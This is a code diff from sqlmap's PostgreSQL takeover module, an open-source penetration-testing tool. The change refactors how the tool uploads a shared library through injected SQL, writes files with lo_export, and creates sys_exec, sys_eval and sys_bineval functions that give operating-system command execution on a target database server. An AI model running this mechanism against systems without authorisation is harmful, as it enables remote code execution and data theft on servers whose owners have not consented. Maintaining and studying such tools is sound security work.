@@ -34,7 +34,6 @@ from lib.core.common import getHtmlErrorFp
 from lib.core.common import getRange
 from lib.core.common import randomInt
 from lib.core.common import randomStr
-from lib.core.common import readInput
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -63,6 +62,21 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
 
     def __init__(self):
         self.excludeDbsList = PGSQL_SYSTEM_DBS
+        self.sysUdfs        = {
+                                # UDF name: UDF parameters' input data-type and return data-type
+                                "sys_exec":    {
+                                                 "input":  [ "text" ],
+                                                 "return": "int4"
+                                               },
+                                "sys_eval":    {
+                                                 "input":  [ "text" ],
+                                                 "return": "text"
+                                               },
+                                "sys_bineval": {
+                                                 "input":  [ "text" ],
+                                                 "return": "int4"
+                                               }
+                              }
 
         Enumeration.__init__(self, "PostgreSQL")
         Filesystem.__init__(self)
@@ -252,15 +266,15 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
         infoMsg = "fingerprinting the back-end DBMS operating system"
         logger.info(infoMsg)
 
-        self.createSupportTbl(self.fileTblName, self.tblField, "character(500)")
+        self.createSupportTbl(self.fileTblName, self.tblField, "character(1000)")
         inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "VERSION()"))
 
         # Windows executables should always have ' Visual C++' or ' mingw'
         # patterns within the banner
-        osWindows = ( " Visual C++", " mingw" )
+        osWindows = ( " Visual C++", "mingw" )
 
         for osPattern in osWindows:
-            query  =  "(SELECT LENGTH(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
+            query  = "(SELECT LENGTH(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
             query += "LIKE '%" + osPattern + "%')>0"
             query  = agent.forgeCaseStatement(query)
 
@@ -274,11 +288,6 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
 
         infoMsg = "the back-end DBMS operating system is %s" % kb.os
         logger.info(infoMsg)
-
-        if detailed == False:
-            self.cleanup(onlyFileTbl=True)
-
-            return
 
         self.cleanup(onlyFileTbl=True)
 
@@ -408,7 +417,7 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
 
         # NOTE: lo_export() exports up to only 8192 bytes of the file
         # (pg_largeobject 'data' field)
-        inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, dFile))
+        inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, dFile), silent=True)
 
         if confirm == True:
             self.askCheckWrittenFile(wFile, dFile, fileType)
@@ -416,13 +425,46 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
         inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
 
 
-    def udfInit(self):
+    def udfSetRemotePath(self):
+        # On Windows
+        if kb.os == "Windows":
+            # The DLL can be in any folder where postgres user has
+            # read/write/execute access is valid
+            # NOTE: by not specifing any path, it will save into the
+            # data directory, on PostgreSQL 8.3 it is
+            # C:\Program Files\PostgreSQL\8.3\data.
+            self.udfRemoteFile = "%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
+
+        # On Linux
+        else:
+            # The SO can be in any folder where postgres user has
+            # read/write/execute access is valid
+            self.udfRemoteFile = "/tmp/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
+
+
+    def udfCreateFromSharedLib(self, udf, inpRet):
+        if udf in self.udfToCreate:
+            logger.info("creating UDF '%s' from the binary UDF file" % udf)
+
+            inp = ", ".join(i for i in inpRet["input"])
+            ret = inpRet["return"]
+
+            # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
+            inject.goStacked("DROP FUNCTION %s" % udf)
+            inject.goStacked("CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, inp, ret, self.udfRemoteFile, udf))
+
+            self.createdUdf.add(udf)
+        else:
+            logger.debug("keeping existing UDF '%s' as requested" % udf)
+
+
+    def udfInjectCmd(self):
+        self.udfLocalFile     = paths.SQLMAP_UDF_PATH
+        self.udfSharedLibName = "libsqlmapudf%s" % randomStr(lowercase=True)
+
         self.getVersionFromBanner()
 
         banVer = kb.bannerFp["dbmsVersion"]
-        dFile  = None
-        wFile  = paths.SQLMAP_UDF_PATH
-        lib    = "libsqlmapudf%s" % randomStr(lowercase=True)
 
         if banVer >= "8.3":
             majorVer = "8.3"
@@ -430,71 +472,14 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
             majorVer = "8.2"
 
         if kb.os == "Windows":
-            wFile += "/postgresql/windows/%s/lib_postgresqludf_sys.dll" % majorVer
-            libExt = "dll"
+            self.udfLocalFile += "/postgresql/windows/%s/lib_postgresqludf_sys.dll" % majorVer
+            self.udfSharedLibExt = "dll"
         else:
-            wFile += "/postgresql/linux/%s/lib_postgresqludf_sys.so" % majorVer
-            libExt = "so"
+            self.udfLocalFile += "/postgresql/linux/%s/lib_postgresqludf_sys.so" % majorVer
+            self.udfSharedLibExt = "so"
 
-        for udf in ( "sys_exec", "sys_eval" ):
-            if udf in self.createdUdf:
-                continue
-
-            logger.info("checking if %s UDF already exist" % udf)
-
-            query  = agent.forgeCaseStatement("(SELECT proname='%s' FROM pg_proc WHERE proname='%s' OFFSET 0 LIMIT 1)" % (udf, udf))
-            exists = inject.getValue(query, resumeValue=False, unpack=False)
-
-            if exists == "1":
-                message  = "%s UDF already exists, do you " % udf
-                message += "want to overwrite it? [y/N] "
-                output   = readInput(message, default="N")
-
-                if output and output in ("y", "Y"):
-                    self.udfToCreate.add(udf)
-            else:
-                self.udfToCreate.add(udf)
-
-        if len(self.udfToCreate) > 0:
-            # On Windows
-            if kb.os == "Windows":
-                # The DLL can be in any folder where postgres user has
-                # read/write/execute access is valid
-                # NOTE: by not specifing any path, it will save into the
-                # data directory, on PostgreSQL 8.3 it is
-                # C:\Program Files\PostgreSQL\8.3\data.
-                dFile = "%s.%s" % (lib, libExt)
-
-            # On Linux
-            else:
-                # The SO can be in any folder where postgres user has
-                # read/write/execute access is valid
-                dFile = "/tmp/%s.%s" % (lib, libExt)
-
-            self.writeFile(wFile, dFile, "binary", False)
-
-        for udf, retType in ( ( "sys_exec", "int4" ), ( "sys_eval", "text" ) ):
-            if udf in self.createdUdf:
-                continue
-
-            if udf in self.udfToCreate:
-                logger.info("creating %s UDF from the binary UDF file" % udf)
-
-                # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
-                inject.goStacked("DROP FUNCTION %s" % udf)
-                inject.goStacked("CREATE OR REPLACE FUNCTION %s(text) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, retType, dFile, udf))
-            else:
-                logger.debug("keeping existing %s UDF as requested" % udf)
-
-            self.createdUdf.add(udf)
-
+        self.udfInjectCore(self.sysUdfs)
         self.envInitialized = True
-
-        debugMsg  = "creating a support table to write commands standard "
-        debugMsg += "output to"
-        logger.debug(debugMsg)
-
-        self.createSupportTbl(self.cmdTblName, self.tblField, "text")
 
 
     def uncPathRequest(self):
